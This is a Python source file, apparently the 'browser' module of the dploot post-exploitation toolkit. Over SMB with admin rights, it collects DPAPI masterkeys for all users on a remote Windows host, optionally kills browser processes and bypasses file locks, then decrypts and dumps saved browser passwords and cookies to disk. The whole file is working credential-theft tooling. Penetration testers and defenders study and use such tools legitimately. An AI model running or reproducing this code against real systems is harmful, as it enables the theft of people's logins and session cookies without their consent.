import argparse
import logging
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import (
    add_masterkeys_argument_group,
    parse_masterkeys_options,
)

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.triage.browser import BrowserTriage, Cookie
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file

NAME = "browser"


class BrowserAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(
            self.options, self.target
        )

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            if self.options.kill_browser:
                logging.info("Killing browsers")
                for browser_process_name in ["chrome.exe", "msedge.exe", "brave.exe"]:
                    self.conn.perform_taskkill(process_name=browser_process_name)

            def secret_callback(secret):
                if not self.options.show_cookies and isinstance(secret, Cookie):
                    return
                if self.options.quiet:
                    secret.dump_quiet()
                else:
                    secret.dump()

            triage = BrowserTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_secret_callback=secret_callback,
            )
            logging.info(
                "Triage Browser Credentials%sfor ALL USERS\n"
                % (" and Cookies " if self.options.show_cookies else " ")
            )
            triage.triage_browsers(
                gather_cookies=self.options.show_cookies,
                bypass_shared_violation=self.options.bypass_shared_violation,
            )
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = BrowserAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Dump users credentials and cookies saved in browser from local or remote target",
    )

    group = subparser.add_argument_group("credentials options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-show-cookies",
        action="store_true",
        help=("Output dumped cookies from browsers"),
    )

    group.add_argument(
        "-bypass-shared-violation",
        action="store_true",
        help=("Will try to bypass Shared Violation Error with a silly esentutl trick"),
    )

    group.add_argument(
        "-kill-browser",
        action="store_true",
        help=(
            "Will try to kill browser's process. Usefull when Shared Violation Error"
        ),
    )

    add_target_argument_group(subparser)

    return NAME, entry
